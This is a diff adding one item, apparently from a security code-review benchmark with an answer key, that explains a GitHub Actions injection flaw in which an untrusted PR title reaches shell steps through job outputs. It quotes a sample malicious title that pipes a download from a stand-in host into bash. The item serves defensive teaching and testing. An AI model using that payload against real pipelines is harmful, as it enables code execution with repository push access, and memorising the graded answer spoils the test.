@@ -1,0 +1,9 @@
+{
+  "id": 20,
+  "answer": "reject",
+  "context": "Changelog automation runs after a PR merges. A teammate extended it to tag the merge and post a job summary.",
+  "explanation": "The PR title is correctly funneled through `env:` when it's first captured in the `extract` job — but that safety is undone downstream. `needs.extract.outputs.title` still carries the raw, attacker-controlled title, and both new steps interpolate it directly into `run:` (`git tag -a ... -m \"...\"` and the summary echo), on top of the existing `git commit -m` usage. A PR titled `x\" && curl evil.sh | bash && echo \"` executes arbitrary shell in a job that has push access to the repo. Job outputs aren't automatically \"safe\" — they're just as dangerous as the original event context if the value itself is untrusted. Fix: pass the output through `env:` in each step and reference the shell variable, never the `${{ }}` expression, inside `run:`.",
+  "language": "ci",
+  "category": "security",
+  "difficulty": 4
+}
